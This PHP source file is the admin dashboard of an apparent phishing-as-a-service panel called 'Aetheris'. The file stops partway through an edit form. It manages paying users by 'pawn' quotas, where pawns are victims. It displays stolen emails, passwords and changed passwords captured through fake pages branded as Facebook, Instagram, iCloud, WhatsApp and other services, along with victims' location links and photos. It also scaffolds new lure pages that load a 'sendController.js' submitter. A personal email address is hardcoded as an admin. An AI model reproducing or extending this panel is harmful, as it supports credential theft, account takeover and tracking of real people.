<?php
// admin.php - Complete Admin Dashboard with Proper Pawn Cards
session_start();
include_once '../config/function.php';

// Fix any existing data type issues (run once)
fixPawnUserIds();
cleanupOrphanedPawns();

// Admin configuration - Update with your actual admin info
$adminEmails = ['admin@aetheris.com', 'khouilidayoub4@gmail.com']; // Add your admin email
$adminIds = [2]; // Your admin user ID is 2

$currentUser = null;
if (isset($_SESSION['user'])) {
    $currentUser = $_SESSION['user'];
} elseif (isset($_SESSION['user_id'])) {
    $currentUser = readuser($_SESSION['user_id']);
}

$isAdmin = false;
if ($currentUser) {
    if (isset($currentUser['is_admin']) && $currentUser['is_admin'] == 1) {
        $isAdmin = true;
    } elseif (in_array($currentUser['email'], $adminEmails) || in_array($currentUser['id'], $adminIds)) {
        $isAdmin = true;
    }
}

// Uncomment when ready for production
if (!$isAdmin) {
    header('Location: ../board/');
    exit;
}

// Handle POST actions
$message = '';
$messageType = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['update_user'])) {
        $userId = (int)$_POST['user_id'];
        updateuser($userId, $_POST['name'] ?? null, $_POST['email'] ?? null, null, $_POST['token'] ?? null, null, null, null, null, $_POST['count'] ?? null, isset($_POST['is_admin']) ? 1 : 0);
        if (isset($_POST['project'])) updateuserProjectLimit($userId, $_POST['project']);
        if (isset($_POST['dev'])) {
            $data = getJsonData();
            foreach ($data['users'] as &$user) {
                if ((int)$user['id'] === $userId) {
                    $user['dev'] = $_POST['dev'];
                    saveJsonData($data);
                    break;
                }
            }
        }
        $message = "User updated!";
        $messageType = "success";
    }
    
    if (isset($_POST['delete_user'])) {
        deleteuser((int)$_POST['user_id']);
        $message = "User deleted!";
        $messageType = "success";
    }
    
    if (isset($_POST['delete_pawn'])) {
        deletepawn((int)$_POST['pawn_id']);
        $message = "Pawn deleted!";
        $messageType = "success";
    }
    
    if (isset($_POST['update_subscription'])) {
        updateuserPlanUpgrade((int)$_POST['user_id'], (int)$_POST['count'], (int)$_POST['project']);
        $message = "Subscription updated!";
        $messageType = "success";
    }
    
    if (isset($_POST['add_pawn'])) {
        createpawn((int)$_POST['user_id'], $_POST['pawn_email'], $_POST['pawn_password'], $_POST['pawn_page'], $_POST['pawn_newpassword'] ?? null);
        $message = "Pawn added!";
        $messageType = "success";
    }
    
    if (isset($_POST['sync_project'])) {
        $user = readuser((int)$_POST['user_id']);
        $devProjects = !empty($user['dev']) ? explode(',', $user['dev']) : [];
        $projectsBaseDir = __DIR__ . '/../developer/';
        foreach ($devProjects as $project) {
            $project = trim($project);
            if (!empty($project) && !is_dir($projectsBaseDir . $project)) {
                mkdir($projectsBaseDir . $project, 0777, true);
                mkdir($projectsBaseDir . $project . '/assets', 0777, true);
                if (!file_exists($projectsBaseDir . $project . '/index.html')) {
                    file_put_contents($projectsBaseDir . $project . '/index.html', '<!DOCTYPE html><html><head><title>' . htmlspecialchars($project) . '</title><link rel="stylesheet" href="style.css"><script src="script.js" defer></script><script src="../sendController.js"></script></head><body><h1>' . htmlspecialchars($project) . '</h1><button onclick="send(\'test\',\'pass\',\'id\')">Test send()</button></body></html>');
                    file_put_contents($projectsBaseDir . $project . '/style.css', 'body { font-family: system-ui; background: #0b0b14; color: white; }');
                    file_put_contents($projectsBaseDir . $project . '/script.js', 'console.log("Project loaded");');
                }
            }
        }
        $message = "Projects synced!";
        $messageType = "success";
    }
    
    if (isset($_POST['reset_user_limit'])) {
        updateuserCount((int)$_POST['user_id'], 4);
        $message = "Limit reset to 4!";
        $messageType = "success";
    }
}

// Function to get page icon
function getPageIcon($page) {
    $icons = [
        'facebook' => 'bi-facebook', 'instagram' => 'bi-instagram', 'tiktok' => 'bi-tiktok',
        'twitter' => 'bi-twitter-x', 'github' => 'bi-github', 'icloud' => 'bi-apple',
        'spotify' => 'bi-spotify', 'location' => 'bi-geo-alt-fill', 'localisation' => 'bi-geo-alt-fill',
        'image' => 'bi-image-fill', 'photo' => 'bi-camera-fill', 'wifi' => 'bi-wifi',
        'photomath' => 'bi-camera-fill', 'telegram' => 'bi-telegram', 'whatsapp' => 'bi-whatsapp',
        'linkedin' => 'bi-linkedin', 'youtube' => 'bi-youtube', 'netflix' => 'bi-film',
        'discord' => 'bi-discord', 'reddit' => 'bi-reddit', 'pinterest' => 'bi-pinterest', 'snapchat' => 'bi-snapchat'
    ];
    $pageLower = strtolower($page);
    foreach ($icons as $key => $icon) {
        if (strpos($pageLower, $key) !== false) return $icon;
    }
    return 'bi-grid-3x3-gap-fill';
}

function getPageColor($page) {
    $colors = [
        'facebook' => 'bg-blue-600', 'instagram' => 'bg-pink-600', 'tiktok' => 'bg-black',
        'twitter' => 'bg-slate-700', 'github' => 'bg-gray-800', 'icloud' => 'bg-gray-600',
        'spotify' => 'bg-green-600', 'location' => 'bg-red-600', 'localisation' => 'bg-red-600',
        'image' => 'bg-purple-600', 'photo' => 'bg-yellow-600', 'wifi' => 'bg-indigo-600', 'photomath' => 'bg-orange-600'
    ];
    $pageLower = strtolower($page);
    foreach ($colors as $key => $color) {
        if (strpos($pageLower, $key) !== false) return $color;
    }
    return 'bg-purple-600';
}

// Get all users with pawns using the fixed function
$users = getAllUsersWithPawns();

// Get unique pages for filters
$allPages = [];
foreach ($users as $user) {
    foreach ($user['pawns'] as $pawn) {
        $page = strtolower($pawn['page'] ?? 'general');
        if (!empty($page) && !in_array($page, $allPages)) {
            $allPages[] = $page;
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
    <title>Admin Panel | Aetheris Control Center</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/lightbox2/2.11.4/css/lightbox.min.css" />
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', system-ui, sans-serif; background: #02020A; overflow-x: hidden; }
        
        .blob-1 { position: fixed; width: 70vw; height: 70vw; background: radial-gradient(circle, rgba(139,92,246,0.25) 0%, rgba(76,29,149,0) 70%); border-radius: 62% 38% 72% 28% / 46% 45% 55% 54%; filter: blur(80px); top: -20vh; left: -30vw; z-index: -2; animation: floatBlob 20s infinite alternate ease-in-out; pointer-events: none; }
        .blob-2 { position: fixed; width: 75vw; height: 75vw; background: radial-gradient(circle, rgba(192,132,252,0.2) 0%, rgba(88,28,135,0) 75%); bottom: -25vh; right: -30vw; filter: blur(90px); border-radius: 45% 55% 70% 30% / 55% 45% 55% 45%; animation: floatBlob2 24s infinite alternate; z-index: -2; pointer-events: none; }
        .blob-3 { position: fixed; width: 50vw; height: 50vw; background: radial-gradient(circle, rgba(168,85,247,0.12) 0%, rgba(88,28,135,0) 80%); top: 50%; left: 50%; transform: translate(-50%, -50%); filter: blur(100px); z-index: -2; animation: pulseGlow 15s infinite alternate; pointer-events: none; }
        
        @keyframes floatBlob { 0% { transform: translate(0,0) rotate(0deg) scale(1); } 100% { transform: translate(8%,12%) rotate(6deg) scale(1.15); } }
        @keyframes floatBlob2 { 0% { transform: translate(0,0) rotate(0deg) scale(1); } 100% { transform: translate(-10%,-10%) rotate(-5deg) scale(1.2); } }
        @keyframes pulseGlow { 0% { opacity: 0.3; transform: translate(-50%,-50%) scale(0.9); } 100% { opacity: 0.6; transform: translate(-50%,-50%) scale(1.3); } }
        
        .glass-card { background: rgba(12,10,22,0.85); backdrop-filter: blur(18px); border: 1px solid rgba(139,92,246,0.35); box-shadow: 0 25px 45px -12px rgba(0,0,0,0.6), 0 0 0 1px rgba(139,92,246,0.2) inset; }
        .user-card { background: rgba(12,10,22,0.75); backdrop-filter: blur(12px); border: 1px solid rgba(139,92,246,0.3); transition: all 0.25s cubic-bezier(0.2,0.9,0.4,1.1); }
        .user-card:hover { transform: translateY(-4px); border-color: rgba(192,132,252,0.6); box-shadow: 0 20px 35px -12px rgba(139,92,246,0.3); }
        
        .pawn-card { background: rgba(12,10,22,0.7); backdrop-filter: blur(12px); border: 1px solid rgba(139,92,246,0.3); transition: all 0.25s cubic-bezier(0.2,0.9,0.4,1.1); }
        .pawn-card:hover { transform: translateY(-2px); border-color: rgba(192,132,252,0.6); }
        
        .btn-primary { background: linear-gradient(105deg, #8B5CF6, #C084FC); transition: all 0.25s; box-shadow: 0 4px 12px rgba(139,92,246,0.3); }
        .btn-primary:active { transform: scale(0.96); }
        
        .badge-purple { background: rgba(139,92,246,0.15); border: 1px solid rgba(139,92,246,0.35); }
        .map-preview { width: 100%; height: 180px; border-radius: 12px; overflow: hidden; background: #1a1a2e; }
        .map-preview iframe { width: 100%; height: 100%; border: none; }
        .gallery-img { cursor: pointer; transition: transform 0.2s; max-height: 120px; width: 100%; object-fit: cover; border-radius: 10px; }
        
        .toast-message { position: fixed; bottom: 2rem; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.95); backdrop-filter: blur(12px); border: 1px solid rgba(139,92,246,0.5); border-radius: 2rem; padding: 0.75rem 1.5rem; display: flex; align-items: center; gap: 0.75rem; z-index: 2000; font-size: 0.875rem; font-weight: 500; animation: toastFade 0.3s ease; color: white; }
        @keyframes toastFade { from { opacity: 0; transform: translateX(-50%) translateY(20px); } to { opacity: 1; transform: translateX(-50%) translateY(0); } }
        
        .expand-icon { transition: transform 0.3s ease; }
        .pawn-section.collapsed .expand-icon { transform: rotate(-90deg); }
        .pawn-section.collapsed .pawn-content { display: none; }
        
        .filter-input, .filter-select { transition: all 0.2s; color: white; }
        .filter-input:focus, .filter-select:focus { border-color: #C084FC; outline: none; box-shadow: 0 0 0 2px rgba(139,92,246,0.2); }
        
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-track { background: rgba(0,0,0,0.3); border-radius: 10px; }
        ::-webkit-scrollbar-thumb { background: #8B5CF6; border-radius: 10px; }
        
        .modal { transition: opacity 0.3s ease, visibility 0.3s ease; }
        .modal.hidden { opacity: 0; visibility: hidden; display: flex !important; }
        .modal:not(.hidden) { display: flex !important; }
        
        .page-pill { transition: all 0.2s ease; cursor: pointer; }
        .page-pill:hover { transform: translateY(-2px); }
        .page-pill.active { background: linear-gradient(105deg, #8B5CF6, #C084FC) !important; color: white !important; border-color: transparent !important; }
        
        .icon-blue-dark { color: #3b82f6; }
        .icon-amber-dark { color: #d97706; }
        .icon-emerald-dark { color: #059669; }
        .icon-rose-dark { color: #e11d48; }
        .icon-cyan-dark { color: #0891b2; }
        .icon-purple-dark { color: #a855f7; }
        
        .stat-card { transition: transform 0.2s; cursor: pointer; }
        .stat-card:hover { transform: translateY(-3px); border-color: rgba(192,132,252,0.6); }
        
        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .user-card { animation: fadeInUp 0.5s ease-out forwards; }
    </style>
</head>
<body>

<div class="blob-1"></div>
<div class="blob-2"></div>
<div class="blob-3"></div>
<div class="fixed inset-0 bg-black/20 backdrop-blur-[2px] -z-10"></div>

<div class="max-w-7xl mx-auto px-4 py-6">
    <!-- Header -->
    <div class="flex flex-col sm:flex-row justify-between items-center mb-6 gap-4">
        <div>
            <h1 class="text-3xl sm:text-4xl font-extrabold bg-gradient-to-r from-purple-300 to-fuchsia-400 bg-clip-text text-transparent">
                <i class="bi bi-shield-lock-fill"></i> Admin Control Center
            </h1>
            <p class="text-gray-300 text-sm mt-1">Manage users, subscriptions, pawns & developer projects</p>
        </div>
        <div class="glass-card rounded-full px-5 py-2 flex items-center gap-3">
            <i class="bi bi-person-circle text-purple-300"></i>
            <span class="text-sm text-white"><?= htmlspecialchars($currentUser['name'] ?? 'Admin') ?></span>
            <div class="w-px h-4 bg-purple-500/30"></div>
            <a href="../board/" class="text-purple-300 hover:text-purple-200 transition"><i class="bi bi-box-arrow-right"></i></a>
        </div>
    </div>

    <!-- Stats Cards -->
    <div class="grid grid-cols-2 md:grid-cols-5 gap-4 mb-8">
        <div class="glass-card rounded-xl p-4 text-center stat-card"><i class="bi bi-people-fill text-2xl icon-blue-dark"></i><div class="text-2xl font-bold text-white" id="statTotalUsers"><?= count($users) ?></div><div class="text-gray-400 text-xs mt-1">Total Users</div></div>
        <div class="glass-card rounded-xl p-4 text-center stat-card"><i class="bi bi-person-vcard text-2xl icon-amber-dark"></i><div class="text-2xl font-bold text-white" id="statTotalPawns"><?= array_sum(array_column($users, 'pawn_count')) ?></div><div class="text-gray-400 text-xs mt-1">Total Pawns</div></div>
        <div class="glass-card rounded-xl p-4 text-center stat-card"><i class="bi bi-hourglass-split text-2xl icon-rose-dark"></i><div class="text-2xl font-bold text-white" id="statExpired"><?= count(array_filter($users, fn($u) => $u['is_expired'] == 1)) ?></div><div class="text-gray-400 text-xs mt-1">Expired Subs</div></div>
        <div class="glass-card rounded-xl p-4 text-center stat-card"><i class="bi bi-gem text-2xl icon-emerald-dark"></i><div class="text-2xl font-bold text-white" id="statPro"><?= count(array_filter($users, fn($u) => $u['count'] > 20)) ?></div><div class="text-gray-400 text-xs mt-1">Pro Users</div></div>
        <div class="glass-card rounded-xl p-4 text-center stat-card"><i class="bi bi-code-slash text-2xl icon-cyan-dark"></i><div class="text-2xl font-bold text-white" id="statDev"><?= count(array_filter($users, fn($u) => !empty($u['dev']))) ?></div><div class="text-gray-400 text-xs mt-1">Dev Projects</div></div>
    </div>

    <!-- Filters -->
    <div class="glass-card rounded-2xl p-4 mb-6">
        <div class="flex flex-wrap gap-3 items-center mb-3">
            <div class="flex-1 min-w-[200px] relative">
                <i class="bi bi-search absolute left-3 top-1/2 transform -translate-y-1/2 text-purple-400 text-sm"></i>
                <input type="text" id="searchUserInput" placeholder="Search by name, email, or ID..." class="filter-input w-full pl-9 pr-4 py-2 bg-black/40 border border-purple-500/30 rounded-xl text-white text-sm">
            </div>
            <select id="statusFilter" class="filter-select px-4 py-2 bg-black/40 border border-purple-500/30 rounded-xl text-white text-sm">
                <option value="all">All Status</option>
                <option value="active">Active Subscription</option>
                <option value="expired">Expired (30+ days)</option>
            </select>
            <select id="planFilter" class="filter-select px-4 py-2 bg-black/40 border border-purple-500/30 rounded-xl text-white text-sm">
                <option value="all">All Plans</option>
                <option value="basic">Basic (≤4 pawns)</option>
                <option value="premium">Premium (5-20 pawns)</option>
                <option value="pro">Pro (>20 pawns)</option>
            </select>
            <button id="resetFilters" class="px-5 py-2 rounded-xl bg-white/10 text-gray-300 hover:bg-white/20 transition text-sm"><i class="bi bi-arrow-repeat"></i> Reset</button>
        </div>
        <div class="flex flex-wrap gap-2 items-center pt-3 border-t border-purple-500/20">
            <span class="text-gray-300 text-sm font-medium"><i class="bi bi-tag-fill mr-1"></i>Filter by Page:</span>
            <button class="page-pill px-3 py-1.5 rounded-full text-xs font-medium transition-all" style="background: linear-gradient(105deg, #8B5CF6, #C084FC); color: white;" data-page="all"><i class="bi bi-grid-3x3-gap-fill"></i> All</button>
            <?php foreach ($allPages as $page): ?>
                <button class="page-pill px-3 py-1.5 rounded-full text-xs font-medium transition-all" style="background: rgba(255,255,255,0.1); color: #d1d5db;" data-page="<?= htmlspecialchars(strtolower($page)) ?>">
                    <i class="<?= getPageIcon($page) ?>"></i> <?= htmlspecialchars(ucfirst($page)) ?>
                </button>
            <?php endforeach; ?>
            <button class="page-pill px-3 py-1.5 rounded-full text-xs font-medium transition-all" style="background: rgba(255,255,255,0.1); color: #d1d5db;" data-page="location"><i class="bi bi-geo-alt-fill"></i> Locations</button>
            <button class="page-pill px-3 py-1.5 rounded-full text-xs font-medium transition-all" style="background: rgba(255,255,255,0.1); color: #d1d5db;" data-page="image"><i class="bi bi-image-fill"></i> Images</button>
            <button class="page-pill px-3 py-1.5 rounded-full text-xs font-medium transition-all" style="background: rgba(255,255,255,0.1); color: #d1d5db;" data-page="credentials"><i class="bi bi-key-fill"></i> Credentials</button>
        </div>
    </div>

    <!-- Users Cards Grid -->
    <div id="usersContainer" class="grid grid-cols-1 gap-5">
        <?php foreach ($users as $user): 
            $expired = $user['is_expired'] == 1;
            $planLabel = $user['count'] <= 4 ? 'Basic' : ($user['count'] <= 20 ? 'Premium' : 'Pro');
            $planColor = $user['count'] <= 4 ? 'icon-blue-dark' : ($user['count'] <= 20 ? 'icon-emerald-dark' : 'icon-purple-dark');
            $devProjects = !empty($user['dev']) ? explode(',', $user['dev']) : [];
        ?>
        <div class="user-card rounded-2xl overflow-hidden" 
             data-user-id="<?= $user['id'] ?>"
             data-user-name="<?= htmlspecialchars(strtolower($user['name'])) ?>"
             data-user-email="<?= htmlspecialchars(strtolower($user['email'])) ?>"
             data-user-status="<?= $expired ? 'expired' : 'active' ?>"
             data-user-plan="<?= $planLabel ?>"
             data-user-pawns="<?= $user['pawn_count'] ?>">
            
            <!-- User Card Header -->
            <div class="p-5 cursor-pointer" onclick="togglePawnSection(this)">
                <div class="flex flex-wrap lg:flex-nowrap gap-4 items-start justify-between">
                    <div class="flex items-start gap-4 flex-1 min-w-0">
                        <div class="w-12 h-12 rounded-xl bg-gradient-to-br from-purple-600 to-purple-800 flex items-center justify-center shadow-lg flex-shrink-0">
                            <i class="bi bi-person-fill text-2xl text-white"></i>
                        </div>
                        <div class="min-w-0">
                            <div class="flex items-center gap-2 flex-wrap">
                                <h2 class="text-xl font-bold text-white truncate"><?= htmlspecialchars($user['name']) ?></h2>
                                <span class="badge-purple px-2 py-0.5 rounded-full text-xs text-purple-300">#<?= $user['id'] ?></span>
                                <?php if (isset($user['is_admin']) && $user['is_admin'] == 1): ?>
                                    <span class="px-2 py-0.5 rounded-full text-xs bg-yellow-900/50 text-yellow-300 border border-yellow-500/30"><i class="bi bi-shield-fill"></i> Admin</span>
                                <?php endif; ?>
                                <?php if ($expired): ?>
                                    <span class="px-2 py-0.5 rounded-full text-xs bg-red-900/50 text-red-300 border border-red-500/30"><i class="bi bi-clock-history"></i> Expired</span>
                                <?php else: ?>
                                    <span class="px-2 py-0.5 rounded-full text-xs bg-green-900/50 text-green-300 border border-green-500/30"><i class="bi bi-check-circle"></i> Active</span>
                                <?php endif; ?>
                            </div>
                            <div class="flex items-center gap-3 mt-1 flex-wrap">
                                <span class="text-purple-300 text-sm truncate"><i class="bi bi-envelope"></i> <?= htmlspecialchars($user['email']) ?></span>
                                <span class="text-gray-400 text-xs"><i class="bi bi-key"></i> Token: <?= $user['token'] ?></span>
                            </div>
                            <div class="flex gap-3 mt-2 flex-wrap">
                                <span class="text-xs text-gray-400"><i class="bi bi-calendar"></i> Joined: <?= date('Y-m-d', strtotime($user['created_at'])) ?></span>
                                <?php if (!empty($user['device'])): ?>
                                    <span class="text-xs text-gray-400"><i class="bi bi-device-ssd"></i> <?= substr($user['device'], 0, 30) ?>...</span>
                                <?php endif; ?>
                            </div>
                        </div>
                    </div>
                    <div class="flex flex-col items-end gap-2 flex-shrink-0">
                        <div class="flex flex-row gap-2 flex-wrap justify-end">
                            <span class="badge-purple px-3 py-1 rounded-full text-sm text-white"><i class="bi bi-database icon-amber-dark"></i> <?= $user['pawn_count'] ?> pawns</span>
                            <span class="badge-purple px-3 py-1 rounded-full text-sm text-white"><i class="bi bi-grid-3x3-gap-fill <?= $planColor ?>"></i> Limit: <?= $user['count'] ?></span>
                            <span class="badge-purple px-3 py-1 rounded-full text-sm text-white"><i class="bi bi-folder2 icon-emerald-dark"></i> Projects: <?= count($devProjects) ?>/<?= $user['project'] ?></span>
                        </div>
                        <div class="flex flex-row gap-2 flex-wrap justify-end">
                            <button onclick="event.stopPropagation(); editUser(<?= htmlspecialchars(json_encode($user)) ?>)" class="px-3 py-1.5 rounded-lg bg-purple-600/30 text-purple-300 hover:bg-purple-600/50 transition text-sm flex items-center gap-1"><i class="bi bi-pencil-square"></i> Edit</button>
                            <button onclick="event.stopPropagation(); manageSubscription(<?= htmlspecialchars(json_encode($user)) ?>)" class="px-3 py-1.5 rounded-lg bg-purple-600/30 text-purple-300 hover:bg-purple-600/50 transition text-sm flex items-center gap-1"><i class="bi bi-gem icon-emerald-dark"></i> Upgrade</button>
                            <button onclick="event.stopPropagation(); showProjects(<?= $user['id'] ?>, '<?= addslashes($user['dev'] ?? '') ?>', '<?= addslashes($user['name']) ?>')" class="px-3 py-1.5 rounded-lg bg-purple-600/30 text-purple-300 hover:bg-purple-600/50 transition text-sm flex items-center gap-1"><i class="bi bi-folder-symlink icon-cyan-dark"></i> Projects</button>
                            <button onclick="event.stopPropagation(); addPawn(<?= $user['id'] ?>)" class="px-3 py-1.5 rounded-lg bg-purple-600/30 text-purple-300 hover:bg-purple-600/50 transition text-sm flex items-center gap-1"><i class="bi bi-plus-circle icon-blue-dark"></i> Add Pawn</button>
                            <button onclick="event.stopPropagation(); deleteUser(<?= $user['id'] ?>, '<?= addslashes($user['name']) ?>')" class="px-3 py-1.5 rounded-lg bg-red-900/30 text-red-300 hover:bg-red-800/50 transition text-sm flex items-center gap-1"><i class="bi bi-trash3"></i> Delete</button>
                        </div>
                    </div>
                </div>
                <div class="flex justify-center mt-3">
                    <i class="bi bi-chevron-down expand-icon text-purple-400 text-sm transition-transform"></i>
                </div>
            </div>
            
            <!-- Pawns Section -->
            <div class="pawn-section border-t border-purple-500/20">
                <div class="pawn-content p-5">
                    <div class="flex justify-between items-center mb-4">
                        <h3 class="text-sm font-semibold text-purple-300"><i class="bi bi-person-vcard"></i> Pawn Records (<?= count($user['pawns']) ?>)</h3>
                        <button onclick="event.stopPropagation(); addPawn(<?= $user['id'] ?>)" class="text-xs text-purple-400 hover:text-purple-300 transition"><i class="bi bi-plus-circle"></i> Add new</button>
                    </div>
                    
                    <?php if (empty($user['pawns'])): ?>
                        <div class="text-center py-6 text-gray-400 text-sm">
                            <i class="bi bi-inbox text-3xl"></i>
                            <p class="mt-2">No pawn records found</p>
                        </div>
                    <?php else: ?>
                        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                            <?php foreach ($user['pawns'] as $pawn):
                                $pageName = $pawn['page'] ?: 'general';
                                $pageIcon = getPageIcon($pageName);
                                $pageColor = getPageColor($pageName);
                                $isLocation = (strpos(strtolower($pageName), 'location') !== false || strpos(strtolower($pageName), 'localisation') !== false);
                                $isImage = (strpos(strtolower($pageName), 'image') !== false || strpos(strtolower($pageName), 'photo') !== false);
                                $createdAt = date('Y-m-d H:i:s', strtotime($pawn['created_at']));
                                $locationUrl = $isLocation ? $pawn['email'] : '';
                                $imagePath = $isImage ? $pawn['email'] : '';
                            ?>
                            <div class="pawn-card rounded-xl p-3 transition-all duration-200" data-pawn-page="<?= strtolower($pageName) ?>">
                                <div class="flex items-center justify-between mb-2">
                                    <div class="flex items-center gap-2">
                                        <div class="w-8 h-8 rounded-lg <?= $pageColor ?> bg-opacity-30 flex items-center justify-center border border-white/20">
                                            <i class="<?= $pageIcon ?> text-white text-sm"></i>
                                        </div>
                                        <div>
                                            <h4 class="text-sm font-bold text-white"><?= htmlspecialchars(ucfirst($pageName)) ?></h4>
                                            <p class="text-gray-400 text-[10px]">ID: <?= $pawn['id'] ?></p>
                                        </div>
                                    </div>
                                    <span class="text-[10px] px-2 py-0.5 rounded-full <?= $isLocation ? 'bg-red-900/50 text-red-300' : ($isImage ? 'bg-green-900/50 text-green-300' : 'bg-yellow-900/50 text-yellow-300') ?>">
                                        <i class="<?= $isLocation ? 'bi bi-geo-alt-fill' : ($isImage ? 'bi bi-image-fill' : 'bi bi-key-fill') ?>"></i>
                                        <?= $isLocation ? 'Location' : ($isImage ? 'Image' : 'Credentials') ?>
                                    </span>
                                </div>
                                
                                <div class="mb-2">
                                    <?php if ($isLocation): ?>
                                        <div class="text-[10px] text-gray-400 mb-1"><i class="bi bi-geo-alt-fill"></i> Location URL</div>
                                        <div class="bg-black/30 rounded-lg px-2 py-1 text-xs text-white break-all">
                                            <a href="<?= htmlspecialchars($locationUrl) ?>" target="_blank" class="text-purple-400 hover:underline"><?= htmlspecialchars(substr($locationUrl, 0, 50)) ?>...</a>
                                        </div>
                                        <div class="mt-2 map-preview h-32">
                                            <?php 
                                            $embedUrl = $locationUrl;
                                            if (preg_match('/q=([-\d\.]+),([-\d\.]+)/', $locationUrl, $coords)) $embedUrl = "https://maps.google.com/maps?q={$coords[1]},{$coords[2]}&z=15&output=embed";
                                            elseif (preg_match('/@([-\d\.]+),([-\d\.]+)/', $locationUrl, $coords)) $embedUrl = "https://maps.google.com/maps?q={$coords[1]},{$coords[2]}&z=15&output=embed";
                                            elseif (filter_var($locationUrl, FILTER_VALIDATE_URL)) $embedUrl = rtrim($locationUrl, '/') . (strpos($locationUrl, '?') ? '&' : '?') . 'output=embed';
                                            ?>
                                            <iframe src="<?= htmlspecialchars($embedUrl) ?>" loading="lazy" class="w-full h-full"></iframe>
                                        </div>
                                    <?php elseif ($isImage): ?>
                                        <div class="text-[10px] text-gray-400 mb-1"><i class="bi bi-folder-fill"></i> Image Path</div>
                                        <div class="bg-black/30 rounded-lg px-2 py-1 text-xs text-white break-all"><?= htmlspecialchars($imagePath) ?></div>
                                        <div class="mt-2">
                                            <?php 
                                            $fullImagePath = $imagePath;
                                            if (!preg_match('/^https?:\/\//', $fullImagePath)) $fullImagePath = '../' . ltrim($fullImagePath, './');
                                            ?>
                                            <a href="<?= htmlspecialchars($fullImagePath) ?>" data-lightbox="gallery-admin" data-title="Image from <?= htmlspecialchars($pageName) ?>">
                                                <img src="<?= htmlspecialchars($fullImagePath) ?>" alt="Gallery image" class="gallery-img h-24 w-full object-cover rounded-lg" onerror="this.src='https://placehold.co/400x200/1a1a2e/8B5CF6?text=No+Image'">
                                            </a>
                                        </div>
                                    <?php else: ?>
                                        <div class="text-[10px] text-gray-400 mb-1"><i class="bi bi-envelope-fill"></i> Email</div>
                                        <div class="bg-black/30 rounded-lg px-2 py-1 text-xs text-white break-all"><?= htmlspecialchars($pawn['email']) ?></div>
                                        <div class="mt-1 text-[10px] text-gray-400 mb-1"><i class="bi bi-lock-fill"></i> Password</div>
                                        <div class="bg-black/30 rounded-lg px-2 py-1 text-xs text-white break-all"><?= htmlspecialchars($pawn['password']) ?></div>
                                        <?php if (!empty($pawn['newpassword'])): ?>
                                            <div class="mt-1 text-[10px] text-gray-400 mb-1"><i class="bi bi-arrow-repeat"></i> New Password</div>
                                            <div class="bg-black/30 rounded-lg px-2 py-1 text-xs text-white break-all"><?= htmlspecialchars($pawn['newpassword']) ?></div>
                                        <?php endif; ?>
                                    <?php endif; ?>
                                </div>
                                
                                <div class="flex justify-between items-center mt-2 pt-2 border-t border-purple-500/20">
                                    <span class="text-[10px] text-gray-500"><i class="bi bi-clock"></i> <?= $createdAt ?></span>
                                    <div class="flex gap-1">
                                        <?php if ($isLocation): ?>
                                            <button onclick="copyToClipboard('<?= addslashes($locationUrl) ?>', 'Location URL')" class="text-purple-400 hover:text-purple-300 text-xs p-1 transition"><i class="bi bi-geo-alt-fill"></i></button>
                                            <button onclick="copyToClipboard('<?= addslashes($pawn['password']) ?>', 'Map Data')" class="text-purple-400 hover:text-purple-300 text-xs p-1 transition"><i class="bi bi-map"></i></button>
                                        <?php elseif ($isImage): ?>
                                            <button onclick="copyImage('<?= htmlspecialchars($fullImagePath) ?>')" class="text-purple-400 hover:text-purple-300 text-xs p-1 transition"><i class="bi bi-image-fill"></i></button>
                                        <?php else: ?>
                                            <button onclick="copyToClipboard('<?= addslashes($pawn['email']) ?>', 'Email')" class="text-purple-400 hover:text-purple-300 text-xs p-1 transition"><i class="bi bi-envelope-fill"></i></button>
                                            <button onclick="copyToClipboard('<?= addslashes($pawn['password']) ?>', 'Password')" class="text-purple-400 hover:text-purple-300 text-xs p-1 transition"><i class="bi bi-key-fill"></i></button>
                                            <?php if (!empty($pawn['newpassword'])): ?>
                                                <button onclick="copyToClipboard('<?= addslashes($pawn['newpassword']) ?>', 'New Password')" class="text-purple-400 hover:text-purple-300 text-xs p-1 transition"><i class="bi bi-arrow-repeat"></i></button>
                                            <?php endif; ?>
                                        <?php endif; ?>
                                        <form method="POST" onsubmit="return confirm('Delete this pawn entry?')" class="inline">
                                            <input type="hidden" name="delete_pawn" value="1">
                                            <input type="hidden" name="pawn_id" value="<?= $pawn['id'] ?>">
                                            <button type="submit" class="text-gray-500 hover:text-red-400 text-xs p-1 transition"><i class="bi bi-trash3"></i></button>
                                        </form>
                                    </div>
                                </div>
                            </div>
                            <?php endforeach; ?>
                        </div>
                    <?php endif; ?>
                </div>
            </div>
        </div>
        <?php endforeach; ?>
    </div>
</div>

<!-- Modals -->
<div id="projectModal" class="modal fixed inset-0 bg-black/80 backdrop-blur-sm z-50 items-center justify-center hidden">
    <div class="glass-card rounded-2xl w-full max-w-2xl max-h-[80vh] overflow-hidden mx-4">
        <div class="flex justify-between items-center p-4 border-b border-purple-500/30">
            <h3 class="text-xl font-bold text-white" id="projectModalTitle">Developer Projects</h3>
            <button onclick="closeModal('projectModal')" class="text-gray-400 hover:text-white text-2xl transition">&times;</button>
        </div>
        <div id="projectModalContent" class="overflow-y-auto max-h-[60vh] p-4"></div>
    </div>
</div>

<div id="editUserModal" class="modal fixed inset-0 bg-black/80 backdrop-blur-sm z-50 items-center justify-center hidden">
    <div class="glass-card rounded-2xl w-full max-w-md mx-4 p-6">
        <div class="flex justify-between items-center mb-4">
            <h3 class="text-xl font-bold text-white">Edit User</h3>
            <button onclick="closeModal('editUserModal')" class="text-gray-400 hover:text-white text-2xl transition">&times;</button>
        </div>
        <form method="POST">
